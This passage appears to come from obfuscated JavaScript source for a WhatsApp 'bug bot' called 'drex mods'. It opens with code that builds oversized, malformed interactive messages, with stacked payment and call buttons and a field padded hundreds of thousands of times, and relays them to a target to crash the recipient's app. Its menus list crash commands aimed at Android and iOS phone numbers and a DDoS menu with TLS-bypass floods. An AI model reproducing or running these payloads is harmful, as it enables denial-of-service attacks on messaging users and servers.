                'messageParamsJson': "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ \",\"body\":\"xxx\"}",
                'buttons': [_0x29b070 ? {
                  'name': "single_select",
                  'buttonParamsJson': "{\"title\":\"✨⃟༑⌁𝔻ℝ𝔼𝕏 𝐂𝐫𝐚𝐬𝐡 ϟ〽️" + '᬴'.repeat(0x0) + "\",\"sections\":[{\"title\":\"𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                } : {
                  'name': "payment_method",
                  'buttonParamsJson': ''
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "payment_method",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "review_and_pay",
                  'buttonParamsJson': ''
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "review_and_pay",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "payment_info",
                  'buttonParamsJson': ''
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "payment_info",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "single_select",
                  'buttonParamsJson': "{\"title\":\"✨⃟༑⌁𝔻ℝ𝔼𝕏 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"sections\":[{\"title\":\"𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                }, {
                  'name': "galaxy_message",
                  'buttonParamsJson': "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  'name': "mpm",
                  'buttonParamsJson': '{}'
                }]
              }
            }
          }
        }
      }), {
        'userJid': _0x186bdc,
        'quoted': _0x88600e
      });
      await _0x1acf89.relayMessage(_0x186bdc, _0x254532.message, _0x4e36cd ? {
        'participant': {
          'jid': _0x186bdc
        }
      } : {});
      console.log(chalk.green("Send Bug By d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢ 🔥☠️"));
    }
    ;
    const _0x313de1 = {
      'key': {
        'fromMe': false,
        'participant': "0@s.whatsapp.net",
        'remoteJid': "status@broadcast"
      },
      'message': {
        'orderMessage': {
          'orderId': "999999999999",
          'thumbnail': null,
          'itemCount': 0xe8d4a50fff,
          'status': "INQUIRY",
          'surface': "CATALOG",
          'message': "▾ ☠️⃟ᝤ𝐗͢𝐕͖𝐍ͧ Э͜𝐗͢𝐂𝐋͋𝐔͖𝐒͢їѴͦ𝐄͆͡ຯ͜͡🩸͜ ▾",
          'token': "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
      },
      'contextInfo': {
        'mentionedJid': ["27746135260@s.whatsapp.net"],
        'forwardingScore': 0x3e7,
        'isForwarded': true
      }
    };
    const _0x357f5a = {
      'key': {
        'remoteJid': 'p',
        'fromMe': false,
        'participant': "0@s.whatsapp.net"
      },
      'message': {
        'interactiveResponseMessage': {
          'body': {
            'text': "Sent",
            'format': "DEFAULT"
          },
          'nativeFlowResponseMessage': {
            'name': "galaxy_message",
            'paramsJson': "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(0x7a120) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            'version': 0x3
          }
        }
      }
    };
    if (!_0x1acf89["public"]) {
      if (!_0x470adc.key.fromMe) {
        return;
      }
    }
    async function _0x5711c5() {
      var _0x43f48c = ['𝗔', "𝗔𝗯𝘆𝘆", "d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢ ⚡"];
      let {
        key: _0x4933b0
      } = await _0x1acf89.sendMessage(_0x479590, {
        'text': '.'
      });
      for (let _0x39dc88 = 0x0; _0x39dc88 < _0x43f48c.length; _0x39dc88++) {
        await _0x1acf89.sendMessage(_0x479590, {
          'text': _0x43f48c[_0x39dc88],
          'edit': _0x4933b0
        });
      }
    }
    const _0x427bb7 = _0x29390f => {
      _0x1acf89.sendMessage(_0x470adc.chat, {
        'text': _0x29390f,
        'contextInfo': {
          'mentionedJid': [_0x463c24],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': "𝐗𝐯𝐍 𝐆𝐮𝐚𝐑𝐊 ⚡🔥",
            'body': '',
            'previewType': "PHOTO",
            'thumbnailUrl': '',
            'thumbnail': fs.readFileSync("./image/nulll.jpg"),
            'sourceUrl': '' + isLink
          }
        }
      }, {
        'quoted': _0x470adc
      });
    };
    if (_0x470adc.isGroup && !_0x470adc.key.fromMe && !_0x3cc2ac && antilink) {
      if (!_0xece5e) {
        return;
      }
      if (_0x38db03.match("whatsapp.com")) {
        _0x1acf89.sendMessage(_0x470adc.chat, {
          'text': "*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group " + _0x30d6ac.subject
        }, {
          'quoted': _0x470adc
        });
        _0x1acf89.groupParticipantsUpdate(_0x470adc.chat, [_0x463c24], "delete");
        _0x1acf89.sendMessage(_0x470adc.chat, {
          'delete': _0x470adc.key
        });
      }
    }
    switch (_0x25c23d) {
      case "menu":
        {
          await _0x5711c5();
          darkphonk = fs.readFileSync("./database/xvnz.mp3");
          const _0x2995ce = " ❲ `d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢ 𝟴.𝟱` ❳\n⮕ Hello " + _0x24f9f6 + " ⚡\n⮕ CREATOR : d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢\n⮕ OWNER : " + global.owner + "\n\n\n✒ .allmenu\n✒ .bugmenu\n✒ .ddosmenu\n ";
          let _0x59f192 = [{
            'title': "⿻  ⌜ LIST MENU ⌟  ⿻",
            'highlight_label': "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': 'Ւ',
              'id': ".allmenu"
            }]
          }, {
            'title': "𝗗𝗔𝗡𝗚𝗘𝗥𝗢𝗨𝗦 ⚠️☣️",
            'highlight_label': "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': '⺢',
              'id': ".bugmenu"
            }]
          }, {
            'highlight_label': "𝖝 𝖇𝖚𝖙𝖙𝖔𝖓",
            'rows': [{
              'title': '☇',
              'id': ".buttonbug"
            }]
          }, {
            'highlight_label': "𝐝𝐝𝐨𝐬 ⚠️",
            'rows': [{
              'title': '☭',
              'id': ".ddosmenu"
            }]
          }];
          let _0x47927a = {
            'title': "d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢͖",
            'sections': _0x59f192
          };
          let _0x5f530b = generateWAMessageFromContent(_0x470adc.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x470adc.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0x2995ce
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "⿻  ⌜ 𝐏𝐮𝐤𝐢𝐦𝐚𝐤 ⌟  ⿻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync("./image/byzx.jpg")
                    }, {
                      'upload': _0x1acf89.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON.stringify(_0x47927a)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x470adc.sender,
            'quoted': _0x470adc
          });
          await _0x1acf89.relayMessage(_0x5f530b.key.remoteJid, _0x5f530b.message, {
            'messageId': _0x5f530b.key.id
          });
        }
        break;
      case "ddosmenu":
        {
          await _0x5711c5();
          const _0x30d776 = " ❲ `d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢ 𝟴.𝟱` ❳\n⮕ Hello " + _0x24f9f6 + "\n⮕ *i am a bot created by Abyy*\n⮕ CREATOR : d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢\n⮕ OWNER : " + global.owner + "\n\n   ⌜ DDOS MENU ⌟\n   \n✒  ᴅᴅᴏs\n✒  ᴍɪx\n✒  ғʟᴏᴀᴅs\n✒  ᴜᴀ\n✒  xᴄʜʀᴏᴍᴇ\n✒  ᴛʟs\n✒  ᴛʟsʙʏᴘᴀss\n✒  ᴛʟsᴠ2\n✒  ᴛʟs-ᴠɪᴘ\n✒  xc\n";
          let _0x469ef6 = [{
            'title': "⿻  ⌜ LIST MENU ⌟  ⿻",
            'highlight_label': "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': 'Ւ',
              'id': ".allmenu"
            }]
          }, {
            'title': "𝗗𝗔𝗡𝗚𝗘𝗥𝗢𝗨𝗦 ⚠️☣️",
            'highlight_label': "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': '⺢',
              'id': ".bugmenu"
            }]
          }, {
            'highlight_label': "𝖝 𝖇𝖚𝖙𝖙𝖔𝖓",
            'rows': [{
              'title': '☇',
              'id': ".buttonbug"
            }]
          }, {
            'highlight_label': "𝐝𝐝𝐨𝐬 ⚠️",
            'rows': [{
              'title': '☭',
              'id': ".ddosmenu"
            }]
          }];
          let _0x7c0651 = {
            'title': "d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢͖",
            'sections': _0x469ef6
          };
          let _0x286204 = generateWAMessageFromContent(_0x470adc.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x470adc.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0x30d776
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "⿻  ⌜ 𝐏𝐮𝐤𝐢𝐦𝐚𝐤 ⌟  ⿻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync("./image/byzx.jpg")
                    }, {
                      'upload': _0x1acf89.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON.stringify(_0x7c0651)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x470adc.sender,
            'quoted': _0x470adc
          });
          await _0x1acf89.relayMessage(_0x286204.key.remoteJid, _0x286204.message, {
            'messageId': _0x286204.key.id
          });
        }
        break;
      case "bugmenu":
        {
          await _0x5711c5();
          const _0x41d65b = "❲ `d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢ 𝟴.𝟱` ❳\n⮕ Hello " + _0x24f9f6 + " ⚡\n⮕ CREATOR : d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢\n⮕ OWNER : " + global.owner + "​​​​​​​​​​​​​​​​\n\n⌜ ANDROID ⌟\n​​​​​​​​​​​​​​​​​​​​​​​​​​\n✒ .xvnhigh *62xxx*\n✒ .abyybugs *62xxx*\n✒ .minerx *62xxx*\n✒ .trashloc *62xxx*\n✒ .bigershard *62xxx*\n\n⌜ IOS ⌟\n\n✒ .ipkentang *62xxx*\n✒ .trashios *62xxx*\n✒ .iosampas *62xxx*\n✒ .iphone *62xxx*\n\n⌜ SYDEX ⌟\n\n✒ .killer *62xxx*\n✒ .vyter *62xxx*\n✒ .xclzk *62xxx*\n✒ .gyxel *62xxx*\n✒ .xyntax *62xxx*\n";
          let _0x28006c = [{
            'title': "⿻  ⌜ LIST MENU ⌟  ⿻",
            'highlight_label': "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': 'Ւ',
              'id': ".allmenu"
            }]
          }, {
            'title': "𝗗𝗔𝗡𝗚𝗘𝗥𝗢𝗨𝗦 ⚠️☣️",
            'highlight_label': "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': '⺢',
              'id': ".bugmenu"
            }]
          }, {
            'highlight_label': "𝖝 𝖇𝖚𝖙𝖙𝖔𝖓",
            'rows': [{
              'title': '☇',
              'id': ".buttonbug"
            }]
          }, {
            'highlight_label': "𝐝𝐝𝐨𝐬 ⚠️",
            'rows': [{
              'title': '☭',
              'id': ".ddosmenu"
            }]
          }];
          let _0x56bb66 = {
            'title': "d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢͖",
            'sections': _0x28006c
          };
          let _0x153387 = generateWAMessageFromContent(_0x470adc.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x470adc.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0x41d65b
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "⿻  ⌜ 𝐏𝐮𝐤𝐢𝐦𝐚𝐤 ⌟  ⿻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync("./image/byzx.jpg")
                    }, {
                      'upload': _0x1acf89.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON.stringify(_0x56bb66)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x470adc.sender,
            'quoted': _0x470adc
          });
          await _0x1acf89.relayMessage(_0x153387.key.remoteJid, _0x153387.message, {
            'messageId': _0x153387.key.id
          });
        }
        break;
      case "allmenu":
        {
          await _0x5711c5();
          const _0x44b53e = "❲ `d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢ 𝟴.𝟱` ❳\n⮕ Hello " + _0x24f9f6 + " ⚡\n⮕ CREATOR : d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢\n⮕ OWNER : " + global.owner + "\n\n\n   ⌜ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ⌟\n\n✒ ᴀᴅᴅᴏᴡɴᴇʀ\n✒ ᴀᴅᴅᴘʀᴇᴍ\n✒ ᴅᴇʟᴏᴡɴᴇʀ\n✒ ᴅᴇʟᴘʀᴇᴍ\n✒ ᴘᴜʙʟɪᴄ\n✒ sᴇʟғ\n\n\n   ⌜ 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔 ⌟\n\n✒ ᴇɴᴄ <ᴄᴏᴅᴇ>\n✒ ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>\n✒ ᴀɪ <ᴛᴇᴋs>\n\n   ⌜ 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔 ⌟\n\n✒ ʜᴅᴠɪᴅᴇᴏ <ʀᴇᴘʟʏ ɪᴍᴀɢᴇ>\n✒ ꜱᴛɪᴄᴋᴇʀ <ʀᴇᴘʟʏ ɪᴍᴀɢᴇ>\n✒ ᴘʟᴀʏ <ɴᴀᴍᴀ ʟᴀɢᴜ>\n\n   ⌜ DDOS MENU ⌟\n   \n✒  ᴅᴅᴏs\n✒  ᴍɪx\n✒  ғʟᴏᴀᴅs\n✒  ᴜᴀ\n✒  xᴄʜʀᴏᴍᴇ\n✒  ᴛʟs\n✒  ᴛʟsʙʏᴘᴀss\n✒  ᴛʟsᴠ2\n✒  ᴛʟs-ᴠɪᴘ\n✒  xc\n\n   ⌜ 𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔 ⌟\n ✒ ᴀᴅᴅɢᴄ\n ✒ ʟɪsᴛᴜsʀ\n ✒ ʟɪsᴛᴀᴅᴍ\n ✒ ᴅᴇʟᴜsʀ\n ✒ ᴅᴇʟᴀᴅᴍ\n ✒ listsrv\n ✒ delsrv\n ✒ toadmin\n ✒ 1ɢʙ\n ✒ 2ɢʙ\n ✒ 3ɢʙ\n ✒ 4ɢʙ\n ✒ 5ɢʙ\n ✒ 6ɢʙ\n ✒ 7ɢʙ\n ✒ 8ɢʙ\n ✒ 9ɢʙ\n ✒ 10ɢʙ\n ✒ ᴜɴʟɪ\n\n  ⌜ 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 ⌟\n✒ ᴛᴀɢᴀʟʟ <ǫᴜᴇʀʏ>\n✒ ᴋɪᴄᴋ <ᴛᴀɢ>\n✒ ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>\n✒ ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>\n";
          let _0x315869 = [{
            'title': "⿻  ⌜ LIST MENU ⌟  ⿻",
            'highlight_label': "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': 'Ւ',
              'id': ".allmenu"
            }]
          }, {
            'title': "𝗗𝗔𝗡𝗚𝗘𝗥𝗢𝗨𝗦 ⚠️☣️",
            'highlight_label': "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': '⺢',
              'id': ".bugmenu"
            }]
          }, {
            'highlight_label': "𝖝 𝖇𝖚𝖙𝖙𝖔𝖓",
            'rows': [{
              'title': '☇',
              'id': ".buttonbug"
            }]
          }, {
            'highlight_label': "𝐝𝐝𝐨𝐬 ⚠️",
            'rows': [{
              'title': '☭',
              'id': ".ddosmenu"
            }]
          }];
          let _0x4b9261 = {
            'title': "d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢͖",
            'sections': _0x315869
          };
          let _0x174abe = generateWAMessageFromContent(_0x470adc.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x470adc.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0x44b53e
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "⿻  ⌜ 𝐏𝐮𝐤𝐢𝐦𝐚𝐤 ⌟  ⿻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync("./image/byzx.jpg")
                    }, {
                      'upload': _0x1acf89.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON.stringify(_0x4b9261)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x470adc.sender,
            'quoted': _0x470adc
          });
          await _0x1acf89.relayMessage(_0x174abe.key.remoteJid, _0x174abe.message, {
            'messageId': _0x174abe.key.id
          });
        }
        break;
      case "buttonbug":
        {
          await _0x5711c5();
          const _0x34d320 = "❲ `d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢ 𝟴.𝟱` ❳\n⮕ Hello " + _0x24f9f6 + " ⚡\n⮕ CREATOR : d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢\n⮕ OWNER : " + global.owner + "\n\n☠️⃟ᝤ𝐗͢𝐕͖𝐍ͧ Э͜𝐗͢𝐂𝐋͋𝐔͖𝐒͢їѴͦ𝐄͆͡ຯ͜͡🩸͜\n\n✒ 𝗫𝗽𝘅𝘇 𝟲𝟮𝘅𝘅𝘅\n\n𝙽𝙾𝚃𝙴 : 𝚒𝚗𝚒 𝚊𝚍𝚊𝚕𝚊𝚑 𝚋𝚞𝚐 𝚋𝚞𝚝𝚝𝚘𝚗 𝚢𝚊𝚗𝚐 𝚓𝚒𝚔𝚊 𝚔𝚊𝚕𝚒𝚊𝚗 𝚔𝚎𝚝𝚒𝚔 𝐱𝐛𝐮𝐭𝐭𝐨𝐧 𝟔𝟐𝐱𝐱𝐱. 𝚖𝚊𝚔𝚊 𝚗𝚊𝚗𝚝𝚒 𝚔𝚊𝚕𝚒𝚊𝚗 𝚊𝚔𝚊𝚗 𝚍𝚒 𝚜𝚞𝚛𝚞𝚑 𝚖𝚎𝚖𝚒𝚕𝚒𝚑 𝚙𝚎𝚗𝚢𝚎𝚛𝚊𝚗𝚐𝚊𝚗 𝚋𝚞𝚐\n──────────────❐";
          let _0x3a60c1 = [{
            'title': "⿻  ⌜ LIST MENU ⌟  ⿻",
            'highlight_label': "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': 'Ւ',
              'id': ".allmenu"
            }]
          }, {
            'title': "𝗗𝗔𝗡𝗚𝗘𝗥𝗢𝗨𝗦 ⚠️☣️",
            'highlight_label': "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': '⺢',
              'id': ".bugmenu"
            }]
          }, {
            'highlight_label': "𝖝 𝖇𝖚𝖙𝖙𝖔𝖓",
            'rows': [{
              'title': '☇',
              'id': ".buttonbug"
            }]
          }, {
            'highlight_label': "𝐝𝐝𝐨𝐬 ⚠️",
            'rows': [{
              'title': '☭',
              'id': ".ddosmenu"
            }]
          }];
          let _0x44d430 = {
            'title': "d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢͖",
            'sections': _0x3a60c1
          };
          let _0x59a9b3 = generateWAMessageFromContent(_0x470adc.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x470adc.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0x34d320
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "⿻  ⌜ 𝐏𝐮𝐤𝐢𝐦𝐚𝐤 ⌟  ⿻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync("./image/byzx.jpg")
                    }, {
                      'upload': _0x1acf89.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON.stringify(_0x44d430)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x470adc.sender,
            'quoted': _0x470adc
          });
          await _0x1acf89.relayMessage(_0x59a9b3.key.remoteJid, _0x59a9b3.message, {
            'messageId': _0x59a9b3.key.id
          });
        }
        break;
      case "tagall":
        {
          if (!_0x3cc2ac && !_0x11ef2f) {
            return _0x427bb7(mess.admin);
          }
          if (!_0x455832) {
            return joreply(mess.only.group);
          }
          if (!q) {
            return _0x427bb7("Teks Nya Mana Kak?");
          }
